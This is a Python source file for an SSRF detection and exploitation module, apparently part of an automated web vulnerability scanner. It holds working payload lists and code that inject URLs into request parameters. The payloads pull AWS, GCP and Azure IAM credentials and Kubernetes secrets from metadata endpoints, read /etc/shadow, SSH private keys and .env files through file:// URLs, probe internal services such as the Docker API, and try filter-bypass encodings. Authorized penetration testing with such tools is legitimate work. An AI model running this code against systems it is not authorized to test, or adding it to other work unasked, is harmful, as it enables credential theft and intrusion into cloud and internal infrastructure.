"""
Advanced SSRF Detection & Exploitation Module

Goes beyond basic SSRF detection:
1. Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean)
2. Internal network scanning (common internal IPs + ports)
3. Protocol smuggling (file://, gopher://, dict://)
4. DNS rebinding detection
5. Blind SSRF via timing + DNS callback
"""
import asyncio
import re
import logging
from urllib.parse import urlparse, quote

import httpx

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Cloud metadata endpoints
CLOUD_METADATA = {
    "aws": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "indicators": ["ami-id", "instance-id", "instance-type", "local-hostname"],
        "critical_paths": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        ],
    },
    "gcp": {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "headers": {"Metadata-Flavor": "Google"},
        "indicators": ["project-id", "instance/zone", "attributes"],
        "critical_paths": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ],
    },
    "azure": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers": {"Metadata": "true"},
        "indicators": ["compute", "vmId", "subscriptionId"],
        "critical_paths": [
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
    },
    "digitalocean": {
        "url": "http://169.254.169.254/metadata/v1/",
        "indicators": ["droplet_id", "hostname", "region"],
    },
    "kubernetes": {
        "url": "https://kubernetes.default.svc.cluster.local/",
        "indicators": ["apiVersion", "kind", "metadata", "items"],
        "critical_paths": [
            "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets",
            "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods",
            "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/kube-system/secrets",
            "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/serviceaccounts/default/token",
        ],
    },
    "alibaba": {
        "url": "http://100.100.100.200/latest/meta-data/",
        "indicators": ["instance-id", "region-id", "image-id"],
    },
    "oracle": {
        "url": "http://169.254.169.254/opc/v2/instance/",
        "indicators": ["compartmentId", "shape", "region"],
    },
}

# Internal network targets to probe
INTERNAL_TARGETS = [
    ("127.0.0.1", [80, 8080, 8443, 3000, 5000, 6379, 9200, 27017, 9000, 11211]),
    ("localhost", [80, 8080, 3306, 5432, 6379, 9200]),
    ("10.0.0.1", [80, 443, 8080]),
    ("172.17.0.1", [80, 8080, 2375, 2376]),  # Docker host
    ("172.17.0.2", [80, 8080, 3000]),         # Docker containers
    ("172.17.0.3", [80, 8080, 3000]),
    ("192.168.1.1", [80, 443]),
    ("0.0.0.0", [80]),
    # Docker socket (critical — RCE)
    ("127.0.0.1", [2375]),  # Docker API unauth
]

# Protocol payloads
PROTOCOL_PAYLOADS = [
    ("file:///etc/passwd", "file_read", ["root:", "bin:", "daemon:"]),
    ("file:///etc/hostname", "file_read", []),
    ("file:///proc/self/environ", "env_leak", ["PATH=", "HOME=", "USER="]),
    ("file:///proc/self/cmdline", "process_info", []),
    ("file:///proc/net/tcp", "network_info", ["local_address"]),
    ("file:///proc/self/cwd/config.py", "source_code", ["SECRET", "DATABASE", "PASSWORD"]),
    ("file:///proc/self/cwd/.env", "env_file", ["SECRET", "DATABASE", "API_KEY"]),
    ("file:///proc/self/cwd/config/database.yml", "db_config", ["password", "host"]),
    ("file:///etc/shadow", "shadow_file", ["root:"]),
    ("file:///root/.ssh/id_rsa", "ssh_key", ["PRIVATE KEY"]),
    ("file:///root/.bash_history", "bash_history", []),
    ("file:///var/run/secrets/kubernetes.io/serviceaccount/token", "k8s_token", ["eyJ"]),
    ("file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "k8s_ca", ["CERTIFICATE"]),
]

# SSRF bypass techniques
BYPASS_TECHNIQUES = [
    # IP obfuscation
    ("http://0x7f000001/", "hex_ip"),
    ("http://2130706433/", "decimal_ip"),
    ("http://017700000001/", "octal_ip"),
    ("http://127.1/", "short_ip"),
    ("http://0/", "zero_ip"),
    # DNS rebinding
    ("http://localtest.me/", "dns_rebind"),
    ("http://spoofed.burpcollaborator.net/", "dns_rebind"),
    # URL encoding
    ("http://%31%32%37%2e%30%2e%30%2e%31/", "url_encoded"),
    # IPv6
    ("http://[::1]/", "ipv6_loopback"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "ipv6_mapped"),
    # Double URL encoding
    ("http://127.0.0.1%2523@attacker.com/", "url_confusion"),
]


class SSRFModule:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def check(self, context: dict, db) -> list[dict]:
        """Run SSRF checks on endpoints that accept URL-like parameters."""
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        findings = []

        # Find URL-accepting parameters
        url_params = self._find_url_params(endpoints, base_url)
        if not url_params:
            return findings

        logger.info(f"SSRF: Found {len(url_params)} URL-accepting endpoints to test")

        headers = {}
        if auth_cookie:
            if auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = auth_cookie

        async with make_client(extra_headers=headers) as client:
            for endpoint_info in url_params[:10]:  # Limit to 10 endpoints
                url = endpoint_info["url"]
                param = endpoint_info["param"]
                method = endpoint_info.get("method", "GET")

                # 1. Cloud metadata check
                cloud = await self._check_cloud_metadata(client, url, param, method)
                if cloud:
                    findings.append(cloud)

                # 2. Internal network scan
                internal = await self._check_internal_network(client, url, param, method)
                findings.extend(internal)

                # 3. Protocol smuggling
                proto = await self._check_protocol_smuggling(client, url, param, method)
                findings.extend(proto)

                # 4. SSRF bypass techniques
                bypasses = await self._check_bypasses(client, url, param, method)
                findings.extend(bypasses)

        return findings

    def _find_url_params(self, endpoints, base_url) -> list[dict]:
        """Identify parameters that likely accept URLs."""
        url_params = []
        url_param_names = {"url", "uri", "path", "redirect", "next", "target", "dest",
                           "destination", "redir", "redirect_uri", "callback", "return",
                           "returnto", "go", "checkout_url", "continue", "view", "page",
                           "file", "document", "folder", "load", "img", "image", "src",
                           "feed", "host", "site", "html", "ref", "data", "link"}

        for ep in endpoints:
            if isinstance(ep, str):
                parsed = urlparse(ep)
                if parsed.query:
                    from urllib.parse import parse_qs
                    params = parse_qs(parsed.query)
                    for pname in params:
                        if pname.lower() in url_param_names:
                            url_params.append({"url": ep, "param": pname, "method": "GET"})
                        # Check if param value looks like a URL
                        val = params[pname][0] if params[pname] else ""
                        if val.startswith(("http://", "https://", "//", "/")):
                            url_params.append({"url": ep, "param": pname, "method": "GET"})
            elif isinstance(ep, dict):
                ep_url = ep.get("url", "")
                for field in ep.get("form_fields", []):
                    fname = field if isinstance(field, str) else field.get("name", "")
                    if fname.lower() in url_param_names:
                        url_params.append({
                            "url": ep_url,
                            "param": fname,
                            "method": ep.get("method", "GET"),
                        })

        return url_params

    async def _check_cloud_metadata(self, client, url, param, method) -> dict | None:
        """Check for cloud metadata access via SSRF."""
        for cloud, config in CLOUD_METADATA.items():
            meta_url = config["url"]
            try:
                async with self.rate_limit:
                    resp = await self._send(client, url, param, meta_url, method)
                    if resp and resp.status_code == 200:
                        body = resp.text
                        if any(ind in body for ind in config["indicators"]):
                            logger.info(f"SSRF: Cloud metadata accessible ({cloud}): {url} param={param}")

                            # Try to get critical data
                            critical_data = {}
                            for cpath in config.get("critical_paths", []):
                                async with self.rate_limit:
                                    cresp = await self._send(client, url, param, cpath, method)
                                    if cresp and cresp.status_code == 200 and len(cresp.text) > 10:
                                        critical_data[cpath] = cresp.text[:500]

                            return {
                                "title": f"SSRF — {cloud.upper()} Cloud Metadata Exposed",
                                "url": url,
                                "param": param,
                                "severity": "critical",
                                "vuln_type": "ssrf",
                                "cloud_provider": cloud,
                                "metadata_response": body[:500],
                                "critical_data": critical_data,
                                "impact": f"Full {cloud.upper()} metadata access. Attacker can steal IAM credentials, access tokens, and instance configuration.",
                                "remediation": "Block requests to 169.254.169.254 and metadata endpoints. Use IMDSv2 (AWS) or equivalent protection.",
                            }
            except Exception:
                continue
        return None

    async def _check_internal_network(self, client, url, param, method) -> list[dict]:
        """Scan internal network via SSRF."""
        findings = []
        for host, ports in INTERNAL_TARGETS:
            for port in ports:
                target = f"http://{host}:{port}/"
                try:
                    async with self.rate_limit:
                        resp = await self._send(client, url, param, target, method)
                        if resp and resp.status_code == 200 and len(resp.text) > 50:
                            # Verify it's not just the original page
                            normal_resp = await self._send(client, url, param, "http://example.com", method)
                            if normal_resp and resp.text != normal_resp.text:
                                service = self._identify_service(resp.text, port)
                                findings.append({
                                    "title": f"SSRF — Internal Service Accessible: {host}:{port} ({service})",
                                    "url": url,
                                    "param": param,
                                    "severity": "high",
                                    "vuln_type": "ssrf",
                                    "internal_target": f"{host}:{port}",
                                    "service": service,
                                    "response_preview": resp.text[:300],
                                    "impact": f"Internal service {service} at {host}:{port} accessible via SSRF. Could lead to further exploitation.",
                                })
                                break  # Found something on this host, move to next
                except Exception:
                    continue
        return findings

    async def _check_protocol_smuggling(self, client, url, param, method) -> list[dict]:
        """Test file:// and other protocol handlers."""
        findings = []
        for payload, check_type, indicators in PROTOCOL_PAYLOADS:
            try:
                async with self.rate_limit:
                    resp = await self._send(client, url, param, payload, method)
                    if resp and resp.status_code == 200:
                        body = resp.text
                        is_match = any(ind in body for ind in indicators) if indicators else len(body) > 20
                        if is_match:
                            findings.append({
                                "title": f"SSRF — {check_type}: {payload.split('/')[-1]}",
                                "url": url,
                                "param": param,
                                "severity": "critical" if check_type in ("file_read", "env_leak", "env_file") else "high",
                                "vuln_type": "ssrf",
                                "protocol": payload.split(":")[0],
                                "payload": payload,
                                "response_preview": body[:500],
                                "impact": f"Server-side file read via {payload.split(':')[0]}:// protocol. Sensitive data exposed.",
                            })
                            if check_type in ("file_read", "env_leak"):
                                break  # One proof is enough
            except Exception:
                continue
        return findings

    async def _check_bypasses(self, client, url, param, method) -> list[dict]:
        """Test SSRF filter bypass techniques."""
        findings = []
        # First check if basic localhost is blocked
        try:
            async with self.rate_limit:
                basic = await self._send(client, url, param, "http://127.0.0.1/", method)
                if basic and basic.status_code == 200 and len(basic.text) > 50:
                    return []  # Basic SSRF already works, no need for bypasses
        except Exception:
            pass

        for payload, technique in BYPASS_TECHNIQUES:
            try:
                async with self.rate_limit:
                    resp = await self._send(client, url, param, payload, method)
                    if resp and resp.status_code == 200 and len(resp.text) > 50:
                        findings.append({
                            "title": f"SSRF Filter Bypass via {technique}",
                            "url": url,
                            "param": param,
                            "severity": "high",
                            "vuln_type": "ssrf",
                            "bypass_technique": technique,
                            "payload": payload,
                            "response_preview": resp.text[:200],
                        })
                        break  # One bypass is enough
            except Exception:
                continue
        return findings

    async def _send(self, client, url, param, payload, method) -> httpx.Response | None:
        """Inject SSRF payload into the parameter."""
        try:
            if method.upper() == "GET":
                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                new_url = urlunparse(parsed._replace(query=urlencode(flat)))
                return await client.get(new_url)
            else:
                return await client.post(url, data={param: payload})
        except Exception:
            return None

    def _identify_service(self, body: str, port: int) -> str:
        """Identify what service is running based on response."""
        body_lower = body.lower()
        if "redis" in body_lower or port == 6379:
            return "Redis"
        if "elasticsearch" in body_lower or port == 9200:
            return "Elasticsearch"
        if "mongodb" in body_lower or port == 27017:
            return "MongoDB"
        if "docker" in body_lower or port == 2375:
            return "Docker API"
        if "mysql" in body_lower or port == 3306:
            return "MySQL"
        if "postgresql" in body_lower or port == 5432:
            return "PostgreSQL"
        if "<html" in body_lower:
            return "HTTP"
        return f"port-{port}"
